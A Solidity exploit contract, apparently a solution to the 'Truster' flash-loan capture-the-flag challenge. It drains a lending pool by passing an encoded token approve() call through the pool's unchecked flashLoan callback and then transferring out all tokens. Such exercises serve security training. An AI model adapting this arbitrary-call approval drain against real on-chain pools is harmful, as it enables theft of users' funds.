// SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.0;

import "hardhat/console.sol";

interface ITrusterLenderPool {
    function flashLoan(
        uint256 borrowAmount,
        address borrower,
        address target,
        bytes calldata data
    ) external;
}

interface Token {
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);
}

contract TrusterChallenge {
    function attack(address _token, address _pool) external {
        // uint256 balanceBefore;

        /* getting the pool to approve all its tokens to this contract, 
        by passing signature of approve function of the token */
        bytes memory data = abi.encodeWithSignature('approve(address,uint256)', address(this), 1000000 * (10 ** 18));
        ITrusterLenderPool(_pool).flashLoan(0, address(this), _token, data);

        uint256 allowance = Token(_token).allowance(_pool, address(this));
        console.log("allowance: ", allowance);

        /* transfer all tokens to attacker address */
        Token(_token).transferFrom(_pool, msg.sender, 1000000 * (10 ** 18));
        uint256 balance = Token(_token).balanceOf(msg.sender);
        console.log("attacker token balance: ", balance);
    }

    // function helper(uint _balanceBefore) external {
    //     console.log("balanceBefore: ", _balanceBefore);
    // }

    // fallback() external {
    //     bytes memory b = msg.data;
    //     console.log("data in fallback: ");
    //     console.logBytes(b);
    // }
}